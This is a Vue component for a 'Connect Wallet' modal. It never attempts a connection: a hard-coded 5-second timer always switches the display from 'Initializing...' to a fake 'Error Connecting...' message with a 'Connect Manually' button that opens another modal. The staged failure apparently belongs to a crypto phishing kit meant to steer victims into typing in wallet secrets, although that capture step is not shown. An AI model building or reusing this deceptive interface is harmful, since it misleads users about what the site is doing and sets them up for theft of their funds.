<template>
  <transition name="modal-fade">
    <div class="modal-overlay">
      <div class="modal" @click.stop>
        <div class="model-header p-4 bg-gray-100 text-black">
          Connect Wallet
        </div>
        <div class="modal-body p-4 space-y-5 mt-6">
          <div class="p-3 rounded-lg" style="border: 1px solid #fc3131">
            <div v-if="!showLoading" class="text-red-500">Initializing...</div>
            <div v-else>
              <span class="text-red-500">Error Connecting...</span>
              <span class="bg-gray-900 text-white rounded-lg ml-2 px-2 py-1 cursor-pointer" @click="removeModal"
                >Connect Manually</span
              >
            </div>
          </div>
          <div class="border border-gray-700 p-3 rounded-lg">
            <img class="rounded-full w-20 h-20" :src="logoUrl" alt="" />
          </div>
        </div>
      </div>
    </div>
  </transition>

</template>

<script>
export default {
  props: {
    logoUrl: {
      type: String,
      default: "",
    },
  },
  data() {
    return {
      showLoading: false,
      myVar: null,
    };
  },
  mounted() {
    this.redirectFunction();
  },
  beforeDestroy() {
    this.showLoading = false
  },
  methods: {
    redirectFunction() {
      let self = this;
      this.myVar = setInterval(function () {
        self.showLoading = true;
        self.myStopFunction();
      }, 5000);
    },
    myStopFunction() {
      clearInterval(this.myVar);
    },
    removeModal() {
        this.$emit("showOtherModal");
    }
  },
};
</script>

<style scoped>
.modal-overlay {
  position: fixed;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
  display: flex;
  justify-content: center;
  background-color: #000000da;
}
.modal {
  /* text-align: center; */
  background-color: white;
  /* padding: 20px; */
  margin: 20px 10px;
  height: fit-content;
  display: block;
  position: relative;
  width: 600px;
  margin-top: 10%;
  /* padding: 60px 0; */
  border-radius: 20px;
}
.close {
  margin: 10% 0 0 16px;
  cursor: pointer;
}
.close-img {
  width: 25px;
}
.check {
  width: 150px;
}
h6 {
  font-weight: 500;
  font-size: 28px;
  margin: 20px 0;
}
p {
  /* font-weight: 500; */
  font-size: 16px;
  margin: 20px 0;
}
button {
  background-color: #ac003e;
  width: 150px;
  height: 40px;
  color: white;
  font-size: 14px;
  border-radius: 16px;
  margin-top: 50px;
}
.modal-fade-enter,
.modal-fade-leave-to {
  opacity: 0;
}
.modal-fade-enter-active,
.modal-fade-leave-active {
  transition: opacity 0.5s ease;
}
</style>
